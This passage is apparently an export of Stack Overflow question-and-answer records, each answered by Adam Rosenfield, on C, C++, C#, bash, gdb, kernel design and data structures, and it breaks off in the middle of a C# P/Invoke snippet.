","9530","Adam Rosenfield","<p>You shouldn't be calling <code>remove()</code> recursively in the third case (where your ""not sure if this is right"" comment is).  In the case where the the node to remove has two children, what you want to do is find the right-most child of the left child (as you are doing; the resulting node is stored in <code>parent</code>).  This node has no right child - make it so that its right child is the right child of the node to be deleted.  Then just change the <code>root</code> variable to be its left child; no need to change the <code>data</code> member in any nodes or to call <code>remove</code> recursively.</p>

<p>In pictures:</p>

<pre>
Before:
         r  &lt;- root points here
       /  \
      /    \
     a      b
    / \    / \
   x   c  y   y
      / \
     x   d
        /
       x

After:
      a    &lt;-- root points here
     / \
    x   c
       / \
      x   d
         / \
        x   b
           / \
          y   y
</pre>
"
"<p>Is there any way of batch renaming files in sub directories?</p>

<p>Example: </p>

<p>Rename *.html to *.htm in a folder which has directories and sub directories.</p>
","9530","Adam Rosenfield","<p>In Bash, you could do the following:</p>

<pre><code>for x in $(find . -name \*.html); do
  mv $x $(echo ""$x"" | sed 's/\.html$/.htm/')
done
</code></pre>
"
"<p>So if I have to choose between a hash table or a prefix tree what are the discriminating factors that would lead me to choose one over the other. From my own naive point of view it seems as though using a trie has some extra overhead since it isn't stored as an array but that in terms of run time (assuming the longest key is the longest english word) it can be essentially O(1) (in relation to the upper bound). Maybe the longest english word is 50 characters?</p>

<p>Hash tables are instant look up <em>once you get the index</em>. Hashing the key to get the index however seems like it could easily take near 50 steps.</p>

<p>Can someone provide me a more experienced perspective on this? Thanks!</p>
","9530","Adam Rosenfield","<p>It all depends on what problem you're trying to solve.  If all you need to do is insertions and lookups, go with a hash table.  If you need to solve more complex problems such as prefix-related queries, then a trie might be the better solution.</p>
"
"<p>I got curious by <a href=""http://dotnet.kapenilattex.com/?p=93"" rel=""nofollow"">Jon Limjap's interview mishap</a> and started to look for efficient ways to do palindrome detection. I checked the <a href=""http://stackoverflow.com/questions/228518/palindrome-golf"">palindrome golf</a> answers and it seems to me that in the answers are two algorithms only, reversing the string and checking from tail and head.</p>

<pre class=""lang-py prettyprint-override""><code>def palindrome_short(s):
    length = len(s)
    for i in xrange(0,length/2):
        if s[i] != s[(length-1)-i]: return False
    return True

def palindrome_reverse(s):
    return s == s[::-1]
</code></pre>

<p>I think neither of these methods are used in the detection of exact palindromes in huge DNA sequences. I looked around a bit and didn't find any free article about what an ultra efficient way for this might be.</p>

<p>A good way might be parallelizing the first version in a divide-and-conquer approach, assigning a pair of char arrays 1..n and length-1-n..length-1 to each thread or processor. </p>

<p>What would be a better way?</p>

<p>Do you know any?</p>
","9530","Adam Rosenfield","<p>Obviously, you're not going to be able to get better than O(n) asymptotic efficiency, since each character must be examined at least once.  You can get better multiplicative constants, though.</p>

<p>For a single thread, you can get a speedup using assembly.  You can also do better by examining data in chunks larger than a byte at a time, but this may be tricky due to alignment considerations.  You'll do even better to use SIMD, if you can examine chunks as large as 16 bytes at a time.</p>

<p>If you wanted to parallelize it, you could divide the string into N pieces, and have processor <code>i</code> compare the segment <code>[i*n/2, (i+1)*N/2)</code> with the segment <code>[L-(i+1)*N/2, L-i*N/2)</code>.</p>
"
"<p>I have seen some declaration of a union inside a struct as follows. Example code given below.</p>

<p>My questions is does it help in any memory savings(typical use for which a union is used for)? I do not see the benefit. </p>

<pre><code>typedef struct
{
    int x1;
    unsigned int x2;
    ourstruct1 ov1;
    ourstruct1 ov2;
    union
    {
            struct
            {
                mystruct1 v1;
                mystruct2 v2;
                mystruct3 v3;
                int* ctxSC;
                mystruct4 v4;
                Bool v5;
                Long v6;
                Long v7;
                Long v8;
                Long v9;
            }mystr;
    };
}structvar1;
</code></pre>

<p>-AD</p>
","9530","Adam Rosenfield","<p>To add to what <a href=""http://stackoverflow.com/questions/249350/unions-declaration-c-code#250453"">Philippe</a> wrote: Microsoft uses this in DirectX to define its <code>D3DMATRIX</code> (and the derived structure `D3DXMATRIX) as follows:</p>

<pre><code>typedef struct _D3DMATRIX {
    union {
        struct {
            float        _11, _12, _13, _14;
            float        _21, _22, _23, _24;
            float        _31, _32, _33, _34;
            float        _41, _42, _43, _44;

        };
        float m[4][4];
    };
} D3DMATRIX;</code></pre>

<p>This allows you to address the matrix elements either by name or by index: both <code>myMat._12</code> and <code>myMat.m[0][1]</code> refer to the second element in the first row of the matrix <code>myMat</code>.  It's really just syntactic sugar, since even the most braindead compiler will optimize accesses such as <code>myMat.m[0][1]</code> into a constant offset calculation.</p>
"
"<p>In Visual Studio, is there any way to make the debugger break whenever a certain file (or class) is entered?  Please don't answer ""just set a breakpoint at the beginning of every method"" :)</p>

<p>I am using C#.</p>
","9530","Adam Rosenfield","<p>Not that I'm aware of.  The best you can do is to put a breakpoint in every method in the file or class.  What are you trying to do?  Are you trying to figure out what method is causing something to change?  If so, perhaps a data breakpoint will be more appropriate.</p>
"
"<p>In Visual Studio, is there any way to make the debugger break whenever a certain file (or class) is entered?  Please don't answer ""just set a breakpoint at the beginning of every method"" :)</p>

<p>I am using C#.</p>
","9530","Adam Rosenfield","<p>You could write a Visual Studio macro that obtained a list of all of the class methods (say, by reading the <code>.map</code> file produced alongside the executable and searching it for the proper symbol names (and then demangling those names)), and then used <a href=""http://msdn.microsoft.com/en-us/library/envdte.breakpoints.add(VS.80).aspx"" rel=""nofollow""><code>Breakpoints.add()</code></a> to programmatically add breakpoints to those functions.</p>
"
"<p>I believe there's a way to find the kth largest element in an unsorted array of length n in O(n).  Or perhaps it's ""expected"" O(n) or something.  How can we do this?</p>
","9530","Adam Rosenfield","<p>The keywords you are looking for are <em>selection algorithm</em>: <a href=""http://en.wikipedia.org/wiki/Selection_algorithm"">Wikipedia</a> lists a number of different ways of doing this.</p>
"
"<p>When should unions be used? Why do we need them?</p>
","9530","Adam Rosenfield","<p>Unions are often used to convert between the binary representations of integers and floats:</p>

<pre><code>union
{
  int i;
  float f;
} u;

// Convert floating-point bits to integer:
u.f = 3.14159f;
printf(""As integer: %08x\n"", u.i);
</code></pre>

<p>Although this is technically undefined behavior according to the C standard (you're only supposed to read the field which was most recently written), it will act in a well-defined manner in virtually any compiler.</p>

<p>Unions are also sometimes used to implement pseudo-polymorphism in C, by giving a structure some tag indicating what type of object it contains, and then unioning the possible types together:</p>

<pre><code>enum Type { INTS, FLOATS, DOUBLE };
struct S
{
  Type s_type;
  union
  {
    int s_ints[2];
    float s_floats[2];
    double s_double;
  };
};

void do_something(struct S *s)
{
  switch(s-&gt;s_type)
  {
    case INTS:  // do something with s-&gt;s_ints
      break;

    case FLOATS:  // do something with s-&gt;s_floats
      break;

    case DOUBLE:  // do something with s-&gt;s_double
      break;
  }
}
</code></pre>

<p>This allows the size of <code>struct S</code> to be only 12 bytes, instead of 28.</p>
"
"<p>Let me know how I can create a basic operating system.</p>

<p>What books do you recommend?</p>
","9530","Adam Rosenfield","<p>I'd highly recommend taking a look at the <a href=""http://pdos.csail.mit.edu/6.828/2008/"" rel=""nofollow"">MIT Operating Systems class</a>.  It's got lots of useful references, and a bunch of lab exercises which you can play around with (including automated grading scripts, so you don't have to be an MIT student to do them).</p>
"
"<p>I'm extracting a folder from a tarball, and I see these zero-byte files showing up in the result (where they are not in the source.)  Setup (all on OS X):</p>

<p>On machine one, I have a directory /My/Stuff/Goes/Here/ containing several hundred files.
I build it like this</p>

<pre><code>tar -cZf mystuff.tgz /My/Stuff/Goes/Here/
</code></pre>

<p>On machine two, I scp the tgz file to my local directory, then unpack it.</p>

<pre><code>tar -xZf mystuff.tgz
</code></pre>

<p>It creates ~scott/My/Stuff/Goes/, but then under Goes, I see two files:</p>

<pre><code>Here/ - a directory,  
Here.bGd - a zero byte file.
</code></pre>

<p>The ""Here.bGd"" zero-byte file has a random 3-character suffix, mixed upper and lower-case characters.  It has the same name as the lowest-level directory mentioned in the tar-creation command.  It only appears at the lowest level directory named.  Anybody know where these come from, and how I can adjust my tar creation to get rid of them?</p>

<p><strong>Update:</strong>  I checked the table of contents on the files using tar tZvf: toc does not list the zero-byte files, so I'm leaning toward the suggestion that the uncompress machine is at fault.  OS X is version 10.5.5 on the unzip machine (not sure how to check the filesystem type).  Tar is GNU tar 1.15.1, and it came with the machine.</p>
","9530","Adam Rosenfield","<p>You can get a table of contents from the tarball by doing</p>

<p><code>tar tZvf mystuff.tgz</code></p>

<p>If those zero-byte files are listed in the table of contents, then the problem is on the computer making the tarball.  If they aren't listed, then the problem is on the computer decompressing the tarball.</p>
"
"<p>I'm trying to figure out if there's a reasonably efficient way to perform a lookup in a dictionary (or a hash, or a map, or whatever your favorite language calls it) where the keys are regular expressions and strings are looked up against the set of keys.  For example (in Python syntax):</p>

<pre><code>&gt;&gt;&gt; regex_dict = { re.compile(r'foo.') : 12, re.compile(r'^FileN.*$') : 35 }
&gt;&gt;&gt; regex_dict['food']
12
&gt;&gt;&gt; regex_dict['foot in my mouth']
12
&gt;&gt;&gt; regex_dict['FileNotFoundException: file.x does not exist']
35
</code></pre>

<p>(Obviously the above example won't work as written in Python, but that's the sort of thing I'd like to be able to do.)</p>

<p>I can think of a naive way to implement this, in which I iterate over all of the keys in the dictionary and try to match the passed in string against them, but then I lose the O(1) lookup time of a hash map and instead have O(n), where n is the number of keys in my dictionary.  This is potentially a big deal, as I expect this dictionary to grow very large, and I will need to search it over and over again (actually I'll need to iterate over it for every line I read in a text file, and the files can be hundreds of megabytes in size).</p>

<p>Is there a way to accomplish this, without resorting to O(n) efficiency?</p>

<p>Alternatively, if you know of a way to accomplish this sort of a lookup in a database, that would be great, too.</p>

<p>(Any programming language is fine -- I'm using Python, but I'm more interested in the data structures and algorithms here.)</p>

<p>Someone pointed out that more than one match is possible, and that's absolutely correct.  Ideally in this situation I'd like to return a list or tuple containing all of the matches.  I'd settle for the first match, though.</p>

<p>I can't see O(1) being possible in that scenario; I'd settle for anything less than O(n), though.  Also, the underlying data structure could be anything, but the basic behavior I'd like is what I've written above: lookup a string, and return the value(s) that match the regular expression keys.</p>
","9530","Adam Rosenfield","<p>This is not possible to do with a regular hash table in any language.  You'll either have to iterate through the entire keyset, attempting to match the key to your regex, or use a different data structure.</p>

<p>You should choose a data structure that is appropriate to the problem you're trying to solve.  If you have to match against any arbitrary regular expression, I don't know of a good solution.  If the class of regular expressions you'll be using is more restrictive, you might be able to use a data structure such as a <a href=""http://en.wikipedia.org/wiki/Trie"" rel=""nofollow"">trie</a> or <a href=""http://en.wikipedia.org/wiki/Suffix_tree"" rel=""nofollow"">suffix tree</a>.</p>
"
"<p>You'll have to forgive my ignorance, but I'm not used to using wide character sets in c++, but is there a way that I can use wide string literals in c++ without putting an L in front of each literal?</p>

<p>If so, how?</p>
","9530","Adam Rosenfield","<p>Why do you not want to prefix string literals with an L?  It's quite simple - strings without an L are ANSI strings (<code>const char*</code>), strings with an L are wide-character strings (<code>const wchar_t*</code>).  There is the <code>TEXT()</code> macro, which makes a string literal into an ANSI or a wide-character string depending on of the current project is set to use Uncode:</p>

<pre><code>
#ifdef UNICODE
#define TEXT(s) L ## s
#else
#define TEXT(s) s
#endif
</code></pre>

<p>There's also the <code>_T()</code> macro, which is equivalent to <code>TEXT()</code>.</p>
"
"<p>I've been trying to understand the strict aliasing rules as they apply to the char pointer.</p>

<p><a href=""http://www.cellperformance.com/mike_acton/2006/06/understanding_strict_aliasing.html#cast_to_char_pointer"">Here</a> this is stated:</p>

<blockquote>
  <p>It is always presumed that a char* may refer to an alias of any object.</p>
</blockquote>

<p>Ok so in the context of socket code, I can do this:</p>

<pre><code>struct SocketMsg
{
   int a;
   int b;
};

int main()
{
   ...
   SocketMsg msgToSend;
   msgToSend.a = 0;
   msgToSend.b = 1;
   send(socket, (char*)(&amp;msgToSend), sizeof(msgToSend);
};
</code></pre>

<p>But then there's this statement</p>

<blockquote>
  <p>The converse is not true. Casting a char* to a pointer of any type other than a char* and dereferencing it is usually in volation of the strict aliasing rule. </p>
</blockquote>

<p>Does this mean that when I recv a char array, I can't reinterpret cast to a struct when I know the structure of the message:</p>

<pre><code>struct SocketMsgToRecv
{
    int a;
    int b;
};

int main()
{
    SocketMsgToRecv* pointerToMsg;
    char msgBuff[100];
    ...
    recv(socket, msgBuff, 100);
    // Ommiting make sure we have a complete message from the stream
    // but lets assume msgBuff[0]  has a complete msg, and lets interpret the msg

    // SAFE!?!?!?
    pointerToMsg = &amp;msgBuff[0];

    printf(""Got Msg: a: %i, b: %i"", pointerToMsg-&gt;a, pointerToMsg-&gt;b);
}
</code></pre>

<p>Will this second example not work because the base type is a char array and I'm casting it to a struct? How do you handle this situation in a strictly aliased world?</p>
","9530","Adam Rosenfield","<p>Correct, the second example is in violation of the strict aliasing rules, so if you compile with the <code>-fstrict-aliasing</code> flag, there's a chance you may get incorrect object code.  The fully correct solution would be to use a union here:</p>

<pre><code>union
{
  SocketMsgToRecv msg;
  char msgBuff[100];
};

recv(socket, msgBuff, 100);

printf(""Got Msg: a: %i, b: %i"", msg.a, msg.b);
</code></pre>
"
"<p>In C++, is (int) ch equivalent to int(ch). </p>

<p>If not, what's the difference?</p>
","9530","Adam Rosenfield","<p>They are the same thing, and also the same as <code>(int)(ch)</code>.  In C++, it's generally preferred to use a named cast to clarify your intentions:</p>

<ul>
<li>Use <code>static_cast</code> to cast between primitive types of different sizes or signednesses, e.g. <code>static_cast&lt;char&gt;(anInteger)</code>.</li>
<li>Use <code>dynamic_cast</code> to downcast a base class to a derived class (polymorphic types only), e.g. <code>dynamic_cast&lt;Derived *&gt;(aBasePtr)</code>.</li>
<li>Use <code>reinterpret_cast</code> to cast between pointers of different types or between a pointer and an integer, e.g. <code>reinterpret_cast&lt;uintptr_t&gt;(somePtr)</code>.</li>
<li>Use <code>const_cast</code> to remove the <code>const</code> or <code>volatile</code> qualifiers from variables (<strong>VERY DANGEROUS</strong>), e.g. <code>const_cast&lt;char *&gt;(aConstantPointer)</code>.</li>
</ul>
"
"<p>I'm designing a database table which will hold filenames of uploaded files. What is the maximum length of a filename in NTFS as used by Windows XP or Vista?</p>
","9530","Adam Rosenfield","<p>Individual components of a filename (i.e. each subdirectory along the path, and the final filename) are limited to 255 characters, and the total path length is limited to approximately 32,000 characters.  However, you should generally try to limit path lengths to below 260 characters (<code>MAX_PATH</code>) when possible.  See <a href=""http://msdn.microsoft.com/en-us/library/aa365247.aspx"">http://msdn.microsoft.com/en-us/library/aa365247.aspx</a> for full details.</p>
"
"<p>How can I create a regex for a string such as this:</p>

<pre><code>&lt;SERVER&gt; &lt;SERVERKEY&gt; &lt;COMMAND&gt; &lt;FOLDERPATH&gt; &lt;RETENTION&gt; &lt;TRANSFERMODE&gt; &lt;OUTPUTPATH&gt; &lt;LOGTO&gt; &lt;OPTIONAL-MAXSIZE&gt; &lt;OPTIONAL-OFFSET&gt;
</code></pre>

<p>Most of these fields are just simple words, but some of them can be paths, such as FOLDERPATH, OUTPUTPATH, these paths can also be paths with a filename and wildcard appended.</p>

<p>Retention is a number, and transfer mode can be bin or ascii. The issue is, LOGTO which can be a path with the logfile name appended to it or can be NO, which means no log file.</p>

<p>The main issue, is the optional arguments, they are both numbers, and OFFSET can't exist without MAXSIZE, but MAXSIZE can exist without offset.</p>

<p>Heres some examples:</p>

<pre><code>loveserver love copy /muffin* 20 bin C:\Puppies\ NO 256 300
loveserver love copy /muffin* 20 bin C:\Puppies\ NO 256
loveserver love copy /hats* 300 ascii C:\Puppies\no\ C:\log\love.log 256
</code></pre>

<p>Now the main issue, is that paths can have spaces in them, so if I use . to match everything, the regex ends up breaking, when parsing the optional arguments where the LOG destination ends up getting attached to the outputpath.</p>

<p>Also if I end up using . and start removing parts of it, the regex will start putting things where it shouldn't.</p>

<p>Heres my regex:</p>

<pre><code>^(\s+)?(?P&lt;SRCHOST&gt;.+)(\s+)(?P&lt;SRCKEY&gt;.+)(\s+)(?P&lt;COMMAND&gt;COPY)(\s+)(?P&lt;SRCDIR&gt;.+)(\s+)(?P&lt;RETENTION&gt;\d+)(\s+)(?P&lt;TRANSFER_MODE&gt;BIN|ASC|BINARY|ASCII)(\s+)(?P&lt;DSTDIR&gt;.+)(\s+)(?P&lt;LOGFILE&gt;.+)(\s+)?(?P&lt;SIZE&gt;\d+)?(\s+)?(?P&lt;OFFSET&gt;\d+)?$
</code></pre>
","9530","Adam Rosenfield","<p>The problem is that because you're allowing spaces in filenames and using spaces to separate fields, the solution is ambiguous.  You either need to use a different field separator character that can't appear in filenames, or use some other method of representing filenames with spaces in them, e.g. putting them in quotation marks.</p>
"
"<p>Are there any drawbacks to using the STL or templates. Are there any situations for which they are inappropriate.</p>
","9530","Adam Rosenfield","<p>See the <a href=""http://yosefk.com/c++fqa/templates.html"" rel=""nofollow"">templates section</a> of the <a href=""http://yosefk.com/c++fqa/"" rel=""nofollow"">C++ FQA</a> [sic] for lots of good reasons to not use templates.</p>
"
"<p>I frequently run into large, non-template classes in C++ where simple methods are defined directly in the class body in the header file instead of separately in the implementation file. For example:</p>

<pre><code>class Foo {
  int getBar() const { return bar; }
  ...
};
</code></pre>

<p>Why do this? It seems like there are disadvantages. The implementation is not as hidden as it should be, the code is less readable, and there would also be an increased burden on the compiler if the class's header file is included in many different places.</p>

<p>My guess is that people intend for these functions to be inlined in other modules, which could improve performance significantly. However, I've heard newer compilers can do inlining (and other interprocedural optimizations) at link-time across modules. How broad is the support for this kind of link-time optimization, and does it actually make these kind of definitions unnecessary? Are there any other good reasons for these definitions?</p>
","9530","Adam Rosenfield","<p>The C++ standard says that methods defined inside the class definition are <code>inline</code> by default.  This results in obvious performance gains for simplistic functions such as getters and setters.  Link-time cross-module optimization is harder, although some compilers can do it.</p>
"
"<p>This very simple code gives me tons of errors:</p>

<pre><code>#include &lt;iostream&gt;
#include &lt;string&gt;

int main() {
    std::string test = "" "";
    std::cout &lt;&lt; test;
}
</code></pre>

<p>I tried to compile it on linux by typing <strong>gcc -o simpletest simpletest.cpp</strong> on the console. I can't see why it isn't working. What is happening?</p>
","9530","Adam Rosenfield","<p>To add to what others have said: <code>g++</code> is the GNU C++ compiler.  <code>gcc</code> is the GNU compiler collection (<strong>not</strong> the GNU C compiler, as many people assume).  <code>gcc</code> serves as a frontend for <code>g++</code> when compiling C++ sources.  <code>gcc</code> can compile C, C++, Objective-C, Fortran, Ada, assembly, and others.</p>

<p>The reason why it fails trying to compile with <code>gcc</code> is that you need to link in the C++ standard library.  By default, <code>g++</code> does this, but <code>gcc</code> does not.  To link in the C++ standard library using <code>gcc</code>, use the following:</p>

<pre><code>gcc -o simpletest simpletest.cpp <b>-lstdc++</b></code></pre>
"
"<p>I always try to avoid to return string literals, because I fear they aren't defined outside of the function. But I'm not sure if this is the case. Let's take, for example, this function:</p>

<pre><code>
const char *
return_a_string(void)
{
    return ""blah"";
}
</code></pre>

<p>Is this correct code? It does work for me, but maybe it only works for my compiler (gcc). So the question is, do (string) literals have a scope or are they present/defined all the time.</p>
","9530","Adam Rosenfield","<p>No, string literals do not have scope, so your code is guaranteed to work across all platforms and compilers.  They are stored in your program's binary image, so you can always access them.  However, trying to write to them (by casting away the <code>const</code>) will lead to undefined behavior.</p>
"
"<p>I'd like to use Doxygen to document legacy code that's a mix of C and x86 assembly language. The assembly language is not inline, but in separate assembly-only files. What is the recommended way to deal with the assembly language portion?</p>
","9530","Adam Rosenfield","<p>See question 12 of the <a href=""http://www.stack.nl/~dimitri/doxygen/faq.html"" rel=""nofollow"">Doxygen FAQ</a>.  Are you dealing with pure assembly files, or inline assembly inside C sources?  Assuming the former, you'll have to either write an input filter to transform the assembly code into something C-like (easier), or write a new parser (much harder).</p>
"
"<p>In C++ when can a virtual function use static binding? If it is being accessed through a pointer, accessed directly, or never?</p>
","9530","Adam Rosenfield","<p>If you want to call the base class version of a function, you can do that by explicitly naming the base class:</p>

<pre><code>class Base
{
public:
  virtual ~Base() {}
  virtual void DoIt() { printf(""In Base::DoIt()\n""); }
};

class Derived : public Base
{
public:
  virtual void DoIt() { printf(""In Derived::DoIt()\n""); }
};

Base *basePtr = new Derived;
basePtr->DoIt();  // Calls Derived::DoIt() through virtual function call
basePtr->Base::DoIt();  // Explicitly calls Base::DoIt() using normal function call
delete basePtr;</code></pre>
"
"<p>I am trying to use native windows API with Qt using mingw toolset. There are link problems with some functions. What happens? Is this a bug with mingw name mangling?</p>

<pre><code>#ifdef Q_WS_WIN
    HWND hwnd = QWidget::winId();
    HDC hdcEMF  = CreateEnhMetaFile(NULL, NULL, NULL, NULL ) ;
    Rectangle(hdcEMF,100,100,200,200);
    HENHMETAFILE hemf = CloseEnhMetaFile(hdcEMF);
    OpenClipboard(hwnd);
    EmptyClipboard();
    SetClipboardData(CF_ENHMETAFILE,hemf);
    CloseClipboard();
#else   </code></pre>

<p>The errors:</p>

<p>undefined reference to `CreateEnhMetaFileW@16'</p>

<p>undefined reference to `Rectangle@20'</p>

<p>undefined reference to `CloseEnhMetaFile@4'</p>
","9530","Adam Rosenfield","<p>The functions <code>CreateEnhMetaFileW()</code> and <code>CloseEnhMetaFile()</code> are defined in the static library Gdi32.lib, so you have to make sure to link against that.  Try adding <code>-lgdi32</code> to the end of your command line you're using to compile.  If that doesn't work, you might have to specify the full path to Gdi32.lib by adding <code>-L/path/to/folder/containing/the/library -lgdi32</code> instead.</p>
"
"<p>Is it possible to inspect the return value of a function in gdb assuming the return value is <b>not</b> assigned to a variable?</p>
","9530","Adam Rosenfield","<p>Yes, just examine the <code>EAX</code> register by typing <code>print $eax</code>.  For most functions, the return value is stored in that register, even if it's not used.</p>

<p>The exceptions to this are functions returning types larger than 32 bits, specifically 64-bit integers (<code>long long</code>), <code>double</code>s, and <code>structs</code> or <code>classes</code>.</p>

<p>The other exception is if you're not running on an Intel architecture. In that case, you'll have to figure out which register is used, if any.</p>
"
"<p>I have this code:</p>

<pre><code>CCalcArchive::CCalcArchive() : m_calcMap()
{
}
</code></pre>

<p><code>m_calcMap</code> is defined as this:</p>

<pre><code>typedef CTypedPtrMap&lt;CMapStringToPtr, CString, CCalculation*&gt; CCalcMap;
CCalcMap&amp; m_calcMap;
</code></pre>

<p>When I compile in Visual Studio 2008, I get this error:</p>

<pre><code>error C2440: 'initializing' : cannot convert from 'int' to 'CCalcArchive::CCalcMap &amp;'
</code></pre>

<p>I don't even understand where it gets the ""int"" error from, and also why this doesn't work? It feels like I'm actually having some sort of syntax error, but isn't this how member initialization lists are supposed to be used? Also, AFAIK, the MFC class <code>CTypedPtrMap</code> has no constructor taking arguments.</p>
","9530","Adam Rosenfield","<p>I'm not sure where it's getting the <code>int</code> from, but you <strong>must</strong> initialize all references in the initializer list.  <code>m_calcMap</code> is declared as a reference, and so it must be initialized to refer to some instance of a <code>CCalcMap</code> object - you can't leave it uninitialized.  If there's no way for you to pass the referred-to object into the constructor, or there's a possibility that you need it to not refer to an object, then use a pointer instead of a reference.</p>
"
"<p>I'm using MessageFormat to format some addresses with a template like this:</p>

<pre><code>""{0}\n{1}\n{2}\n{3}, {4} {5}""
</code></pre>

<p>where</p>

<ul>
<li>0 = street 1</li>
<li>1 = street 2</li>
<li>2 = street 3</li>
<li>3 = city</li>
<li>4 = state</li>
<li>5 = zip</li>
</ul>

<p>Most of these fields are optional when captured.  How do I avoid having an empty line when for instance, there is not street 3?  I could use a template like this ""{0}{1}{2}{3}{4}{5}"" and then substitute either ""street 3\n"" or """" accordingly, but then the template doesn't provide much benefit toward formatting.</p>

<p>Is there a way to include conditionals in the format string?  Or is there another, preferably lightweight, templating tool available that supports conditional formatting?</p>
","9530","Adam Rosenfield","<p>You could just do the formatting the way you're doing it and then remove blank lines by replacing a run of more than one <code>'\n'</code>s with a single <code>'\n'</code>, e.g.</p>

<pre><code>result = result.replaceAll(""\n+"", ""\n"");
</code></pre>
"
"<p>How do I access specific sections of man pages?</p>
","9530","Adam Rosenfield","<p>To add to what <a href=""http://stackoverflow.com/questions/270677/man-sections#270694"">Jason</a> said: if you're not sure what section something is in, you can also see <em>all</em> of the man pages for a given topic by typing</p>

<pre><code>man -a topic
</code></pre>

<p>This is useful for topics such as <code>printf</code>, for which there is both a command and a C function that do similar things.</p>
"
"<p>I'm working on kernel design, and I've got some questions concerning paging.</p>

<p>The basic idea that I have so far is this: Each program gets its own (or so it thinks) 4G of memory, minus a section somewhere that I reserve for kernel functions that the program can call. So, the OS needs to figure out some way to load the pages in memory that the program needs to use during its operation.</p>

<p>Now, assuming that we had infinite amounts of memory and processor time, I could load/allocate any page the program wrote to or read from as it happened using page faults for pages that didn't exist (or were swapped out) so the OS could quickly allocate them or swap them in. In the real world though, I need to optimize this process, so that we don't have a program constantly consuming all memory that it ever touched.</p>

<p>So I guess my question is, how does an OS generally go about this? My initial thought is to create a function that the program calls to set/free pages, which it can then memory manage on its own, but does a program generally do this, or does the compiler assume it has free reign? Also, how does the compiler handle situations where it needs to allocate a fairly large segment of memory? Do I need to provide a function that tries to give it X pages in order?</p>

<p>This is obviously not a language specific question, but I'm partial to standard C and good with C++, so I'd like any code examples to be in either that or assembly. (Assembly shouldn't be necessary, I fully intend to make it work with as much C code as possible, and optimize as a last step.)</p>

<p>Another thing that should be easier to answer as well: How does one generally handle kernel functions that a program needs to call? Is it OK just to have a set area of memory (I was thinking toward the end of virtual space) that contains most basic functions/process specific memory that the program can call? My thought from there would be to have the kernel functions do something very fancy and swap the pages out (so that programs couldn't see sensitive kernel functions in their own space) when programs needed to do anything major, but I'm not really focusing on security at this point.</p>

<p>So I guess I'm more worried about the general design ideas than the specifics. I'd like to make the kernel completely compatible with GCC (somehow) and I need to make sure that it provides everything that a normal program would need.</p>

<p>Thanks for any advice.</p>
","9530","Adam Rosenfield","<p>The answer to this question is highly architecture-dependent.  I'm going to assume you're talking about x86.  With x86, a kernel generally provides a set of <strong>system calls</strong>, which are predetermined entry points into the kernel.  User code can only enter the kernel at those specific points, so the kernel has careful control over how it interacts with user code.</p>

<p>In x86, there are two ways to implement system calls: with interrupts, and with the sysenter/sysexit instructions.  With interrupts, the kernel sets up an <em>interrupt descriptor table</em> (IDT), which defines the possible entry points into the kernel.  User code can then use the <code>int</code> instruction to generate a soft interrupt to call into the kernel.  Interrupts can also be generated by hardware (so-called hard interrupts); those interrupts should generally be distinct from soft interrupts, but they don't have to be.</p>

<p>The sysenter and sysexit instructions are a faster way of performing system calls, since handling interrupts is slow; I'm not that familiar with using them, so I can't comment on whether or not they're a better choice for your situation.</p>

<p>Whichever you use, you'll have to define the system call interface.  You'll probably want to pass system call arguments in registers and not on the stack, since generating an interrupt will cause you to switch stacks to the kernel stack.  This means you'll almost certainly have to write some assembly language stubs on both the user-mode end to make the system call, and again on the kernel end to gather the system call arguments and save the registers.</p>

<p>Once you have all of that in place, you can start thinking about handling page faults.  Page faults are effectively just another type of interrupt - when user code tries to access a virtual address for which there is no page table entry, it will generate interrupt 14, and you'll also get the faulting address as an error code.  The kernel can take this information and then decide to read in the missing page from disk, add the page table mapping, and jump back into user code.</p>

<p>I highly recommend you take a look at some of the materials from the <a href=""http://pdos.csail.mit.edu/6.828/2008/"" rel=""nofollow"">MIT Operating Systems</a> class.  Check out the references section, it's got loads of good stuff.</p>
"
"<p>Does anybody have a suggestion for a java library that performs automatic cropping and deskewing of images (like those retrieved from a flatbed scanner)?</p>
","9530","Adam Rosenfield","<p><a href=""http://www.imagemagick.org"" rel=""nofollow"">ImageMagick</a> can do that; you can use the <a href=""http://sourceforge.net/projects/jmagick/"" rel=""nofollow"">ImageMagick Java bindings</a>.  The <a href=""http://www.imagemagick.org/Usage/crop/#trim"" rel=""nofollow"">auto-crop</a> operator is probably what you're looking for.  Automatic deskewing is a much harder problem and involves some significant image processing; I'm not sure if ImageMagick can handle that.  If you can figure out the skewing parameters using something else, ImageMagick can definitely unskew it for you.</p>
"
"<p>I need to move backwards through an array, so I have code like this:</p>

<pre><code>for (int i = myArray.Length - 1; i &gt;= 0; i--)
{
    // Do something
    myArray[i] = 42;
}
</code></pre>

<p>Is there a better way of doing this?</p>

<p>Update: I was hoping that maybe C# had some built-in mechanism for this like:</p>

<pre><code>foreachbackwards (int i in myArray)
{
    // so easy
}
</code></pre>

<p>Update 2: There <em>are</em> better ways. Rune takes the prize with:</p>

<pre><code>for (int i = myArray.Length; i-- &gt; 0; )
{    
    //do something
}
//or
for (int i = myArray.Length; i --&gt; 0; )
{
    // do something
}
</code></pre>

<p>which looks even better in regular C (thanks to Twotymz):</p>

<pre><code>for (int i = lengthOfArray; i--; )
{    
    //do something
}
</code></pre>
","9530","Adam Rosenfield","<p>That's definitely the best way for any array whose length is a signed integral type.  For arrays whose lengths are an unsigned integral type (e.g. an <code>std::vector</code> in C++), then you need to modify the end condition slightly:</p>

<pre><code>for(size_t i = myArray.size() - 1; i != (size_t)-1; i--)
    // blah
</code></pre>

<p>If you just said <code>i &gt;= 0</code>, this is always true for an unsigned integer, so the loop will be an infinite loop.</p>
"
"<p>I'm trying to get the name of the executable of a window that is outside my C# 2.0 application. My app currently gets a window handle (hWnd) using the GetForegroundWindow() call from ""user32.dll"".</p>

<p>From the digging that I've been able to do, I think I want to use the GetModuleFileNameEx() function (from PSAPI) to obtain the name, but GetModuleFileNameEx() requires a handle to a Process, not a Window. </p>

<p>Is it possible to get a process handle from a window handle? (Do I need to get the thread handle of the window first?)</p>

<p>EDITED the first sentence to make it clearer what I'm trying to do.</p>

<p><strong>UPDATE!</strong> Here's the C# code that I found worked for me. The only caveat is <em>occasionally</em> it returns a file/path where the drive letter is a ""?"" instead of the actual drive letter (like ""C""). -- Haven't figured out why yet.</p>

<pre><code>[DllImport(""user32.dll"")]
static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

[DllImport(""kernel32.dll"")]
static extern IntPtr OpenProcess(UInt32 dwDesiredAccess, Int32 bInheritHandle, UInt32 dwProcessId);

[DllImport(""psapi.dll"")]
